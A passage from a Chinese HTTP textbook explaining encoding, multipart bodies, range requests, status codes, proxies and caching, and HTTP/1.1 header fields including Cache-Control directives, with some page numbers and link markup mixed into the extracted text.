版本。状态行包含表明响应结果的状态码，原因短语和 HTTP 版本。首部字段包含表示请求和响应的各种条件和属性的各类首部。50一般有 4 种首部，分别是：通用首部、请求首部、响应首部和实体首部。其他可能包含 HTTP 的 RFC 里未定义的首部（Cookie 等）。3.3　编码提升传输速率HTTP 在传输数据时可以按照数据原貌直接传输，但也可以在传输过程中通过编码提升传输速率。通过在传输时编码，能有效地处理大量的访问请求。但是，编码的操作需要计算机来完成，因此会消耗更多的 CPU 等资源。3.3.1　报文主体和实体主体的差异报文（message）是 HTTP 通信中的基本单位，由 8 位组字节流（octet sequence，其中 octet 为 8 个比特）组成，通过 HTTP 通信传输。实体（entity）作为请求或响应的有效载荷数据（补充项）被传输，其内容由实体首部和实体主体组成。HTTP 报文的主体用于传输请求或响应的实体主体。通常，报文主体等于实体主体。只有当传输中进行编码操作时，实体主体的内容发生变化，才导致它和报文主体产生差异。报文和实体这两个术语在之后会经常出现，请事先理解两者的差异。3.3.2　压缩传输的内容编码向待发送邮件内增加附件时，为了使邮件容量变小，我们会先用 ZIP压缩文件之后再添加附件发送。HTTP 协议中有一种被称为内容编码的功能也能进行类似的操作。内容编码指明应用在实体内容上的编码格式，并保持实体信息原样压51缩。内容编码后的实体由客户端接收并负责解码。图：内容编码常用的内容编码有以下几种。gzip（GNU zip）compress（UNIX 系统的标准压缩）deflate（zlib）identity（不进行编码）3.3.3　分割发送的分块传输编码在 HTTP 通信过程中，请求的编码实体资源尚未全部传输完成之前，浏览器无法显示请求页面。在传输大容量数据时，通过把数据分割成多块，能够让浏览器逐步显示页面。这种把实体主体分块的功能称为分块传输编码（Chunked TransferCoding）。52图：分块传输编码分块传输编码会将实体主体分成多个部分（块）。每一块都会用十六进制来标记块的大小，而实体主体的最后一块会使用“0(CR+LF)”来标记。使用分块传输编码的实体主体会由接收的客户端负责解码，恢复到编码前的实体主体。HTTP/1.1 中存在一种称为传输编码（Transfer Coding）的机制，它可以在通信时按某种编码方式传输，但只定义作用于分块传输编码中。3.4　发送多种数据的多部分对象集合发送邮件时，我们可以在邮件里写入文字并添加多份附件。这是因为采用了 MIME（Multipurpose Internet Mail Extensions，多用途因特网邮件扩展）机制，它允许邮件处理文本、图片、视频等多个不同类型的53数据。例如，图片等二进制数据以 ASCII 码字符串编码的方式指明，就是利用 MIME 来描述标记数据类型。而在 MIME 扩展中会使用一种称为多部分对象集合（Multipart）的方法，来容纳多份不同类型的数据。相应地，HTTP 协议中也采纳了多部分对象集合，发送的一份报文主体内可含有多类型实体。通常是在图片或文本文件等上传时使用。多部分对象集合包含的对象如下。multipart/form-data在 Web 表单文件上传时使用。multipart/byteranges状态码 206（Partial Content，部分内容）响应报文包含了多个范围的内容时使用。multipart/form-dataContent-Type: multipart/form-data; boundary=AaB03x–AaB03xContent-Disposition: form-data; name=”field1”Joe Blow–AaB03xContent-Disposition: form-data; name=”pics”; filename=”file1.txt”Content-Type: text/plain…（file1.txt的数据）…–AaB03x–multipart/byterangesHTTP/1.1 206 Partial ContentDate: Fri, 13 Jul 2012 02:45:26 GMTLast-Modified: Fri, 31 Aug 2007 02:02:20 GMTContent-Type: multipart/byteranges; boundary=THIS_STRING_SEPARATES–THIS_STRING_SEPARATESContent-Type: application/pdfContent-Range: bytes 500-999/800054…（范围指定的数据）…–THIS_STRING_SEPARATESContent-Type: application/pdfContent-Range: bytes 7000-7999/8000…（范围指定的数据）…–THIS_STRING_SEPARATES–在 HTTP 报文中使用多部分对象集合时，需要在首部字段里加上Content-type。有关这个首部字段，我们稍后讲解。使用 boundary 字符串来划分多部分对象集合指明的各类实体。在boundary 字符串指定的各个实体的起始行之前插入“–”标记（例如：–AaB03x、–THIS_STRING_SEPARATES），而在多部分对象集合对应的字符串的最后插入“–”标记（例如：–AaB03x–、–THIS_STRING_SEPARATES–）作为结束。多部分对象集合的每个部分类型中，都可以含有首部字段。另外，可以在某个部分中嵌套使用多部分对象集合。有关多部分对象集合更详细的解释，请参考 RFC2046。3.5　获取部分内容的范围请求以前，用户不能使用现在这种高速的带宽访问互联网，当时，下载一个尺寸稍大的图片或文件就已经很吃力了。如果下载过程中遇到网络中断的情况，那就必须重头开始。为了解决上述问题，需要一种可恢复的机制。所谓恢复是指能从之前下载中断处恢复下载。要实现该功能需要指定下载的实体范围。像这样，指定范围发送的请求叫做范围请求（Range Request）。对一份 10 000 字节大小的资源，如果使用范围请求，可以只请求5001~10 000 字节内的资源。55执行范围请求时，会用到首部字段 Range 来指定资源的 byte 范围。byte 范围的指定形式如下。5001~10 000 字节Range: bytes=5001-10000从 5001 字节之后全部的Range: bytes=5001-从一开始到 3000 字节和 5000~7000 字节的多重范围Range: bytes=-3000, 5000-7000针对范围请求，响应会返回状态码为 206 Partial Content 的响应报文。另外，对于多重范围的范围请求，响应会在首部字段 Content-Type 标明 multipart/byteranges 后返回响应报文。56如果服务器端无法响应范围请求，则会返回状态码 200 OK 和完整的实体内容。3.6　内容协商返回最合适的内容同一个 Web 网站有可能存在着多份相同内容的页面。比如英语版和中文版的 Web 页面，它们内容上虽相同，但使用的语言却不同。当浏览器的默认语言为英语或中文，访问相同 URI 的 Web 页面时，则会显示对应的英语版或中文版的 Web 页面。这样的机制称为内容协商（Content Negotiation）。图：访问 <a href="http://www.google.com/内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准。包含在请求报文中的某些首部字段（如下）就是判断的基准。这些首部字段的详细说明请参考下一章。AcceptAccept-Charset57Accept-EncodingAccept-LanguageContent-Language内容协商技术有以下" target="_blank" rel="noopener">http://www.google.com/内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准。包含在请求报文中的某些首部字段（如下）就是判断的基准。这些首部字段的详细说明请参考下一章。AcceptAccept-Charset57Accept-EncodingAccept-LanguageContent-Language内容协商技术有以下</a> 3 种类型。服务器驱动协商（Server-driven Negotiation）由服务器端进行内容协商。以请求的首部字段为参考，在服务器端自动处理。但对用户来说，以浏览器发送的信息作为判定的依据，并不一定能筛选出最优内容。客户端驱动协商（Agent-driven Negotiation）由客户端进行内容协商的方式。用户从浏览器显示的可选项列表中手动选择。还可以利用 JavaScript 脚本在 Web 页面上自动进行上述选择。比如按 OS 的类型或浏览器类型，自行切换成 PC 版页面或手机版页面。透明协商（Transparent Negotiation）是服务器驱动和客户端驱动的结合体，是由服务器端和客户端各自进行内容协商的一种方法。58第 4 章　返回结果的 HTTP 状态码HTTP 状态码负责表示客户端 HTTP 请求的返回结果、标记服务器端的处理是否正常、通知出现的错误等工作。让我们通过本章的学习，好好了解一下状态码的工作机制。4.1　状态码告知从服务器端返回的请求结果状态码的职责是当客户端向服务器端发送请求时，描述返回的请求结果。借助状态码，用户可以知道服务器端是正常处理了请求，还是出现了错误。59图：响应的状态码可描述请求的处理结果状态码如 200 OK，以 3 位数字和原因短语组成。数字中的第一位指定了响应类别，后两位无分类。响应类别有以下 5种。表 4-1：状态码的类别类别 原因短语1XX Informational（信息性状态码） 接收的请求正在处理2XX Success（成功状态码） 请求正常处理完毕3XX Redirection（重定向状态码） 需要进行附加操作以完成请求4XX Client Error（客户端错误状态码） 服务器无法处理请求5XX Server Error（服务器错误状态码） 服务器处理请求出错只要遵守状态码类别的定义，即使改变 RFC2616 中定义的状态码，或服务器端自行创建状态码都没问题。仅记录在 RFC2616 上的 HTTP 状态码就达 40 种，若再加上WebDAV（Web-based Distributed Authoring and Versioning，基于万维网的分布式创作和版本控制）（RFC4918、5842） 和附加 HTTP 状态码（RFC6585）等扩展，数量就达 60 余种。别看种类繁多，实际上经常使用的大概只有 14 种。接下来，我们就介绍一下这些具有代表性的 14 个状态码。604.2　2XX 成功2XX 的响应结果表明请求被正常处理了。4.2.1　200 OK表示从客户端发来的请求在服务器端被正常处理了。在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用 GET 方法时，对应请求资源的实体会作为响应返回；而使用 HEAD 方法时，对应请求资源的实体首部不随报文主体作为响应返回（即在响应中只返回首部，不会返回实体的主体部分）。4.2.2　204 No Content该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求处理后，返回 204 响应，那么浏览器显示的页面不发生更新。一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新61信息内容的情况下使用。4.2.3　206 Partial Content该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。4.3　3XX 重定向3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。4.3.1　301 Moved Permanently永久性重定向。该状态码表示请求的资源已被分配了新的 URI，以后应使用资源现在所指的 URI。也就是说，如果已经把资源对应的 URI保存为书签了，这时应该按 Location 首部字段提示的 URI 重新保存。像下方给出的请求 URI，当指定资源路径的最后忘记添加斜杠“/”，就会产生 301 状态码。<a href="http://example.com/sample624.3.2" target="_blank" rel="noopener">http://example.com/sample624.3.2</a>　302 Found临时性重定向。该状态码表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问。和 301 Moved Permanently 状态码相似，但 302 状态码代表的资源不是被永久移动，只是临时性质的。换句话说，已移动的资源对应的URI 将来还有可能发生改变。比如，用户把 URI 保存成书签，但不会像 301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码的页面对应的 URI。4.3.3　303 See Other该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET方法定向获取请求的资源。303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码明确表示客户端应当采用 GET 方法获取资源，这点与 302 状态码有区别。63比如，当使用 POST 方法访问 CGI 程序，其执行后的处理结果是希望客户端能以 GET 方法重定向到另一个 URI 上去时，返回 303 状态码。虽然 302 Found 状态码也可以实现相同的功能，但这里使用 303状态码是最理想的。 11 本书采用的是 HTTP/1.1，而许多 HTTP/1.1 版以前的浏览器不能正确理解 303 状态码。虽然 RFC 1945 和 RFC 2068 规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将 302 响应视为 303 响应，并且使用 GET 方式访问在Location 中规定的 URI，而无视原先请求的方法。所以作者说这里使用 303 是最理想的。——译者注当 301、302、303 响应状态码返回时，几乎所有的浏览器都会把POST 改成 GET，并删除请求报文内的主体，之后请求会自动再次发送。301、302 标准是禁止将 POST 方法改变成 GET 方法的，但实际使用时大家都会这么做。4.3.4　304 Not Modified该状态码表示客户端发送附带条件的请求 2 时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在 3XX 类别中，但是和重定向没有关系。2 附带条件的请求是指采用 GET 方法的请求报文中包含 If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since 中任一首部。4.3.5　307 Temporary Redirect临时重定向。该状态码与 302 Found 有着相同的含义。尽管 302 标准64禁止 POST 变换成 GET，但实际使用时大家并不遵守。307 会遵照浏览器标准，不会从 POST 变成 GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。4.4　4XX 客户端错误4XX 的响应结果表明客户端是发生错误的原因所在。4.4.1　400 Bad Request该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像 200 OK 一样对待该状态码。4.4.2　401 Unauthorized65该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。另外若之前已进行过 1 次请求，则表示用 户认证失败。返回含有 401 的响应必须包含一个适用于被请求资源的 WWW-Authenticate 首部用以质询（challenge）用户信息。当浏览器初次接收到 401 响应，会弹出认证用的对话窗口。4.4.3　403 Forbidden该状态码表明对请求资源的访问被服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分66对原因进行描述，这样就能让用户看到了。未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源 IP 地址试图访问）等列举的情况都可能是发生 403 的原因。4.4.4　404 Not Found该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。4.5　5XX 服务器错误5XX 的响应结果表明服务器本身发生错误。4.5.1　500 Internal Server Error该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web应用存在的 bug 或某些临时的故障。4.5.2　503 Service Unavailable67该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入RetryAfter 首部字段再返回给客户端。状态码和状况的不一致不少返回的状态码响应都是错误的，但是用户可能察觉不到这点。比如 Web 应用程序内部发生错误，状态码依然返回 200 OK，这种情况也经常遇到。68第 5 章　与 HTTP 协作的 Web 服务器一台 Web 服务器可搭建多个独立域名的 Web 网站，也可作为通信路径上的中转服务器提升传输效率。5.1　用单台虚拟主机实现多个域名HTTP/1.1 规范允许一台 HTTP 服务器搭建多个 Web 站点。比如，提供 Web 托管服务（Web Hosting Service）的供应商，可以用一台服务器为多位客户服务，也可以以每位客户持有的域名运行各自不同的网站。这是因为利用了虚拟主机（Virtual Host，又称虚拟服务器）的功能。即使物理层面只有一台服务器，但只要使用虚拟主机的功能，则可以假想已具有多台服务器。69客户端使用 HTTP 协议访问服务器时，会经常采用类似 <a href="http://www.hackr.jp这样的主机名和域名。在互联网上，域名通过" target="_blank" rel="noopener">www.hackr.jp这样的主机名和域名。在互联网上，域名通过</a> DNS 服务映射到 IP 地址（域名解析）之后访问目标网站。可见，当请求发送到服务器时，已经是以 IP 地址形式访问了。所以，如果一台服务器内托管了 <a href="http://www.tricorder.jp" target="_blank" rel="noopener">www.tricorder.jp</a> 和 <a href="http://www.hackr.jp" target="_blank" rel="noopener">www.hackr.jp</a> 这两个域名，当收到请求时就需要弄清楚究竟要访问哪个域名。70在相同的 IP 地址下，由于虚拟主机可以寄存多个不同主机名和域名的 Web 网站，因此在发送 HTTP 请求时，必须在 Host 首部内完整指定主机名或域名的 URI。5.2　通信数据转发程序 ：代理、网关、隧道HTTP 通信时，除客户端和服务器以外，还有一些用于通信数据转发的应用程序，例如代理、网关和隧道。它们可以配合服务器工作。这些应用程序和服务器可以将请求转发给通信线路上的下一站服务器，并且能接收从那台服务器发送的响应再转发给客户端。代理代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。网关网关是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关。隧道隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序。5.2.1　代理71代理服务器的基本行为就是接收客户端发送的请求后转发给其他服务器。代理不改变请求 URI，会直接发送给前方持有资源的目标服务器。持有资源实体的服务器被称为源服务器。从源服务器返回的响应经过代理服务器后再传给客户端。图：每次通过代理服务器转发请求或响应时，会追加写入 Via 首部信息在 HTTP 通信过程中，可级联多台代理服务器。请求和响应的转发会经过数台类似锁链一样连接起来的代理服务器。转发时，需要附加Via 首部字段以标记出经过的主机信息。72使用代理服务器的理由有：利用缓存技术（稍后讲解）减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的，等等。代理有多种使用方法，按两种基准分类。一种是是否使用缓存，另一种是是否会修改报文。缓存代理代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回。透明代理转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。5.2.2　网关73图：利用网关可以由 HTTP 请求转化为其他协议通信网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非 HTTP 协议服务。利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。比如，网关可以连接数据库，使用SQL 语句查询数据。另外，在 Web 购物网站上进行信用卡结算时，网关可以和信用卡结算系统联动。5.2.3　隧道隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL 等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。图：通过隧道的传输，可以和远距离的服务器安全通信。隧道本身是透明的，客户端不用在意隧道的存在5.3　保存资源的缓存缓存是指代理服务器或客户端本地磁盘内保存的资源副本。利用缓存可减少对源服务器的访问，因此也就节省了通信流量和通信时间。缓存服务器是代理服务器的一种，并归类在缓存代理类型中。换句话说，当代理转发从服务器返回的响应时，代理服务器将会保存一份资源的副本。74缓存服务器的优势在于利用缓存可避免多次从源服务器转发资源。因此客户端可就近从缓存服务器上获取资源，而源服务器也不必多次处理相同的请求了。5.3.1　缓存的有效期限即便缓存服务器内有缓存，也不能保证每次都会返回对同资源的请求。因为这关系到被缓存资源的有效性问题。当遇上源服务器上的资源更新时，如果还是使用不变的缓存，那就会演变成返回更新前的“旧”资源了。即使存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性。若判断缓存失效，缓存服务器将会再次从源服务器上获取“新”资源。755.3.2　客户端的缓存缓存不仅可以存在于缓存服务器内，还可以存在客户端浏览器中。以Internet Explorer 程序为例，把客户端缓存称为临时网络文件（Temporary Internet File）。浏览器缓存如果有效，就不必再向服务器请求相同的资源了，可以直接从本地磁盘内读取。另外，和缓存服务器相同的一点是，当判定缓存过期后，会向源服务器确认资源的有效性。若判断浏览器缓存失效，浏览器会再次请求新资源。76在 HTTP 出现之前的协议在 HTTP 普及之前，也就是从互联网的诞生期至今，曾出现过各式各样的协议。在 HTTP 规范确立之际，制定者们参考了那些协议的功能。也有某些协议现在已经彻底退出了人们的视线。接下来，我们会简单介绍一下这些协议。FTP（File Transfer Protocol）传输文件时使用的协议。该协议历史久远，可追溯到 1973 年前后，比 TCP/IP 协议族的出现还要早。虽然它在 1995 年被 HTTP 的流量（Traffic）超越，但时至今日，仍被广泛沿用。NNTP（Network News Transfer Protocol）用于 NetNews 电子会议室内传送消息的协议。在 1986 年前后出现，属于比较古老的一类协议。现在，利用 Web 交换信息已成主流，所以该协议已经不怎么使用了。Archie搜索 anonymous FTP 公开的文件信息的协议。1990 年前后出现，现在已经不常使用。WAIS（Wide Area Information Servers）以关键词检索多个数据库使用的协议。1991 年前后出现。由于现在已经被 HTTP 协议替代，也已经不怎么使用了。Gopher查找与互联网连接的计算机内信息的协议。1991 年前后出现，由于现在已经被 HTTP 协议替代，也已经不怎么使用了。77第 6 章　HTTP 首部HTTP 协议的请求和响应报文中必定包含 HTTP 首部，只是我们平时在使用 Web 的过程中感受不到它。本章我们一起来学习 HTTP 首部的结构，以及首部中各字段的用法。6.1　HTTP 报文首部图：HTTP 报文的结构HTTP 协议的请求和响应报文中必定包含 HTTP 首部。首部内容为客户端和服务器分别处理请求和响应提供所需要的信息。对于客户端用78户来说，这些信息中的大部分内容都无须亲自查看。报文首部由几个字段构成。HTTP 请求报文在请求中，HTTP 报文由方法、URI、HTTP 版本、HTTP 首部字段等部分构成。图：请求报文下面的示例是访问 <a href="http://hackr.jp" target="_blank" rel="noopener">http://hackr.jp</a> 时，请求报文的首部信息。GET / HTTP/1.1Host: hackr.jpUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/2010010Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>; q=0Accept-Language: ja,en-us;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveIf-Modified-Since: Fri, 31 Aug 2007 02:02:20 GMTIf-None-Match: “45bae1-16a-46d776ac”Cache-Control: max-age=0HTTP 响应报文在响应中，HTTP 报文由 HTTP 版本、状态码（数字和原因短语）、HTTP 首部字段 3 部分构成。79图：响应报文以下示例是之前请求访问 <a href="http://hackr.jp/" target="_blank" rel="noopener">http://hackr.jp/</a> 时，返回的响应报文的首部信息。HTTP/1.1 304 Not ModifiedDate: Thu, 07 Jun 2012 07:21:36 GMTServer: ApacheConnection: closeEtag: “45bae1-16a-46d776ac”在报文众多的字段当中，HTTP 首部字段包含的信息最为丰富。首部字段同时存在于请求和响应报文内，并涵盖 HTTP 报文相关的内容信息。因 HTTP 版本或扩展规范的变化，首部字段可支持的字段内容略有不同。本书主要涉及 HTTP/1.1 及常用的首部字段。6.2　HTTP 首部字段6.2.1　HTTP 首部字段传递重要信息HTTP 首部字段是构成 HTTP 报文的要素之一。在客户端与服务器之间以 HTTP 协议进行通信的过程中，无论是请求还是响应都会使用首部字段，它能起到传递额外重要信息的作用。使用首部字段是为了给浏览器和服务器提供报文主体大小、所使用的语言、认证信息等内容。80图：首部字段内可使用的附加信息较多6.2.2　HTTP 首部字段结构HTTP 首部字段是由首部字段名和字段值构成的，中间用冒号“:” 分隔。首部字段名: 字段值例如，在 HTTP 首部中以 Content-Type 这个字段来表示报文主体的 对象类型。Content-Type: text/html就以上述示例来看，首部字段名为 Content-Type，字符串 text/html 是字段值。另外，字段值对应单个 HTTP 首部字段可以有多个值，如下所示。Keep-Alive: timeout=15, max=100若 HTTP 首部字段重复了会如何当 HTTP 报文首部中出现了两个或两个以上具有相同首部字段名时会怎么样？这种情况在规范内尚未明确，根据浏览器内部处理逻辑的不同，结果可能并不一致。有些浏览器会优先处理第一次出现的首部字段，而有些则会优先处理最后出现的首部字段。6.2.3　4 种 HTTP 首部字段类型81HTTP 首部字段根据实际用途被分为以下 4 种类型。通用首部字段（General Header Fields）请求报文和响应报文两方都会使用的首部。请求首部字段（Request Header Fields）从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。响应首部字段（Response Header Fields）从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。实体首部字段（Entity Header Fields）针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息。6.2.4　HTTP/1.1 首部字段一览HTTP/1.1 规范定义了如下 47 种首部字段。表 6-1：通用首部字段首部字段名 说明Cache-Control 控制缓存的行为Connection 逐跳首部、连接的管理Date 创建报文的日期时间Pragma 报文指令Trailer 报文末端的首部一览Transfer-Encoding 指定报文主体的传输编码方式Upgrade 升级为其他协议Via 代理服务器的相关信息Warning 错误通知表 6-2：请求首部字段82首部字段名 说明Accept 用户代理可处理的媒体类型Accept-Charset 优先的字符集Accept-Encoding 优先的内容编码Accept-Language 优先的语言（自然语言）Authorization Web认证信息Expect 期待服务器的特定行为From 用户的电子邮箱地址Host 请求资源所在服务器If-Match 比较实体标记（ETag）If-Modified-Since 比较资源的更新时间If-None-Match 比较实体标记（与 If-Match 相反）If-Range 资源未更新时发送实体 Byte 的范围请求If-Unmodified-Since 比较资源的更新时间（与If-Modified-Since相反）Max-Forwards 最大传输逐跳数Proxy-Authorization 代理服务器要求客户端的认证信息Range 实体的字节范围请求Referer 对请求中 URI 的原始获取方TE 传输编码的优先级User-Agent HTTP 客户端程序的信息表 6-3：响应首部字段首部字段名 说明Accept-Ranges 是否接受字节范围请求Age 推算资源创建经过时间ETag 资源的匹配信息Location 令客户端重定向至指定URIProxy-Authenticate 代理服务器对客户端的认证信息Retry-After 对再次发起请求的时机要求Server HTTP服务器的安装信息Vary 代理服务器缓存的管理信息WWW-Authenticate 服务器对客户端的认证信息83表 6-4：实体首部字段首部字段名 说明Allow 资源可支持的HTTP方法Content-Encoding 实体主体适用的编码方式Content-Language 实体主体的自然语言Content-Length 实体主体的大小（单位：字节）Content-Location 替代对应资源的URIContent-MD5 实体主体的报文摘要Content-Range 实体主体的位置范围Content-Type 实体主体的媒体类型Expires 实体主体过期的日期时间Last-Modified 资源的最后修改日期时间6.2.5　非 HTTP/1.1 首部字段在 HTTP 协议通信交互中使用到的首部字段，不限于 RFC2616 中定义的 47 种首部字段。还有 Cookie、Set-Cookie 和 Content-Disposition等在其他 RFC 中定义的首部字段，它们的使用频率也很高。这些非正式的首部字段统一归纳在 RFC4229 HTTP Header FieldRegistrations 中。6.2.6　End-to-end 首部和 Hop-by-hop 首部HTTP 首部字段将定义成缓存代理和非缓存代理的行为，分成 2 种类型。端到端首部（End-to-end Header）分在此类别中的首部会转发给请求 / 响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。逐跳首部（Hop-by-hop Header）分在此类别中的首部只对单次转发有效，会因通过缓存或代理而不再转发。HTTP/1.1 和之后版本中，如果要使用 hop-by-hop 首部，需提供 Connection 首部字段。84下面列举了 HTTP/1.1 中的逐跳首部字段。除这 8 个首部字段之外，其他所有字段都属于端到端首部。ConnectionKeep-AliveProxy-AuthenticateProxy-AuthorizationTrailerTETransfer-EncodingUpgrade6.3　HTTP/1.1 通用首部字段通用首部字段是指，请求报文和响应报文双方都会使用的首部。6.3.1　Cache-Control通过指定首部字段 Cache-Control 的指令，就能操作缓存的工作机制。85图：首部字段 Cache-Control 能够控制缓存的行为指令的参数是可选的，多个指令之间通过“,”分隔。首部字段 Cache-Control 的指令可用于请求及响应时。Cache-Control: private, max-age=0, no-cacheCache-Control 指令一览可用的指令按请求和响应分类如下所示。表 6-5：缓存请求指令指令 参数 说明no-cache 无 强制向源服务器再次验证no-store 无 不缓存请求或响应的任何内容max-age = [ 秒] 必需 响应的最大Age值max-stale( = [ 秒]) 可省略 接收已过期的响应min-fresh = [ 秒] 必需 期望在指定时间内的响应仍有效no-transform 无 代理不可更改媒体类型only-if-cached 无 从缓存获取资源cache-extension - 新指令标记（token）表 6-6：缓存响应指令指令 参数 说明public 无 可向任意方提供响应的缓存private 可省略 仅向特定用户返回响应no-cache 可省略 缓存前必须先确认其有效性no-store 无 不缓存请求或响应的任何内容no-transform 无 代理不可更改媒体类型must-revalidate 无 可缓存但必须再向源服务器进行确认proxy-revalidate 无要求中间缓存服务器对缓存的响应有效性再进行确认max-age = [ 秒] 必需 响应的最大Age值s-maxage = [ 秒] 必需 公共缓存服务器响应的最大Age值cache-extension - 新指令标记（token）86表示是否能缓存的指令public 指令Cache-Control: public当指定使用 public 指令时，则明确表明其他用户也可利用缓存。private 指令Cache-Control: private当指定 private 指令后，响应只以特定的用户作为对象，这与 public指令的行为相反。缓存服务器会对该特定用户提供资源缓存的服务，对于其他用户发送过来的请求，代理服务器则不会返回缓存。no-cache 指令87Cache-Control: no-cache使用 no-cache 指令的目的是为了防止从缓存中返回过期的资源。客户端发送的请求中如果包含 no-cache 指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发给源服务器。如果服务器返回的响应中包含 no-cache 指令，那么缓存服务器不能对资源进行缓存。源服务器以后也将不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作。Cache-Control: no-cache=Location由服务器返回的响应中，若报文首部字段 Cache-Control 中对 no-cache字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。换言之，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数。控制可执行缓存的对象的指令no-store 指令Cache-Control: no-store当使用 no-store 指令 1 时，暗示请求（和对应的响应）或响应中包含机密信息。1 从字面意思上很容易把 no-cache 误解成为不缓存，但事实上 no-cache 代表不缓存过期的资源，缓存会向源服务器进行有效期确认后处理资源，也许称为 do-not-serve-from-cache-without-revalidation 更合适。no-store 才是真正地不进行缓存，请读者注意区别理解。——译者注因此，该指令规定缓存不能在本地存储请求或响应的任一部分。指定缓存期限和认证的指令s-maxage 指令Cache-Control: s-maxage=604800（单位 ：秒）88s-maxage 指令的功能和 max-age 指令的相同，它们的不同点是 s-maxage 指令只适用于供多位用户使用的公共缓存服务器 2 。也就是说，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。2 这里一般指代理。 ——译者注另外，当使用 s-maxage 指令后，则直接忽略对 Expires 首部字段及max-age 指令的处理。max-age 指令Cache-Control: max-age=604800（单位：秒）当客户端发送的请求中包含 max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。另外，当指定 max-age 值为 0，那么缓存服务器通常需要将请求转发给源服务器。当服务器返回的响应中包含 max-age 指令时，缓存服务器将不对资源的有效性再作确认，而 max-age 数值代表资源保存为缓存的最长时间。应用 HTTP/1.1 版本的缓存服务器遇到同时存在 Expires 首部字段的情况时，会优先处理 max-age 指令，而忽略掉 Expires 首部字段。而HTTP/1.0 版本的缓存服务器的情况却相反，max-age 指令会被忽略89掉。min-fresh 指令Cache-Control: min-fresh=60（单位：秒）min-fresh 指令要求缓存服务器返回至少还未过指定时间的缓存资源。比如，当指定 min-fresh 为 60 秒后，过了 60 秒的资源都无法作为响应返回了。max-stale 指令Cache-Control: max-stale=3600（单位：秒）使用 max-stale 可指示缓存资源，即使过期也照常接收。如果指令未指定参数值，那么无论经过多久，客户端都会接收响应；如果指令中指定了具体数值，那么即使过期，只要仍处于 max-stale指定的时间内，仍旧会被客户端接收。only-if-cached 指令Cache-Control: only-if-cached使用 only-if-cached 指令表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。换言之，该指令要求缓存服务器不重新加载响应，也不会再次确认资源有效性。若发生请求缓存服务器的本地缓存无响应，则返回状态码 504 Gateway Timeout。must-revalidate 指令90Cache-Control: must-revalidate使用 must-revalidate 指令，代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。若代理无法连通源服务器再次获取有效资源的话，缓存必须给客户端一条 504（Gateway Timeout）状态码。另外，使用 must-revalidate 指令会忽略请求的 max-stale 指令（即使已经在首部使用了 max-stale，也不会再有效果）。proxy-revalidate 指令Cache-Control: proxy-revalidateproxy-revalidate 